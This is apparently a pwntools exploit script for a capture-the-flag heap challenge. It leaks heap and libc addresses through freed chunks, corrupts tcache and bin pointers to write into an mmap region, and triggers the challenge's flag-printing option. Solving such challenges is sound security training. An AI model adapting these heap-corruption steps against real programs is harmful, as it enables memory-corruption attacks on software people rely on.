#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- author: n0trix -*-

from pwn import *

context.log_level = 'debug'

elf  = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
io   = process(elf.path)

def getMmap():
    io.recvline()
    return int(io.recvline().strip(),16) 

mmap_addr = getMmap()
log.success('mmap: '+hex(mmap_addr))


def add(size):
    io.sendlineafter('scenery\n','1')
    io.sendlineafter('size:\n',str(size))

def dele(idx):
    io.sendlineafter('scenery\n','2')
    io.sendlineafter('idx:\n',str(idx))

def edit(idx,con):
    io.sendlineafter('scenery\n','3')
    io.sendlineafter('idx:\n',str(idx))
    io.sendafter('chat:\n',con)

def show(idx):
    io.sendlineafter('scenery\n','4')
    io.sendlineafter('idx:\n',str(idx))
    io.recvuntil('see\n')
    return io.recvn(6)

def trigger():
    io.sendlineafter('scenery\n','666')

def puts_flag(flag,idx=0):
    io.sendlineafter('scenery\n','5')
    if flag:
        io.sendlineafter('idx\n',str(idx))
    else:
        io.send('aaaa')


add(0x100) #0
add(0xff)  #1 
add(0x100) #2
dele(1)
for i in range(6):
    add(0xff)
    dele(1)

dele(0)
dele(2)
trigger()

heap_base = u64(show(2).ljust(8,'\x00'))-0x290
libc_base = u64(show(0).ljust(8,'\x00'))-0x1ebce0
log.success('libc: '+hex(libc_base))
log.success('heap: '+hex(heap_base))
#gdb.attach(io)

#use malloc get a chunk from tcache
#now tcache has 6 chunks, prepare for unlink attack(write bin addr)
puts_flag(False)

#write fd = heap+0x290 to bypass check
edit(2,p64(heap_base+0x290)+p64(mmap_addr-0x10))
add(0x100) #1

edit(0,p64(libc_base+0x1ebce0))
puts_flag(True,0)
#puts flag
io.recv()
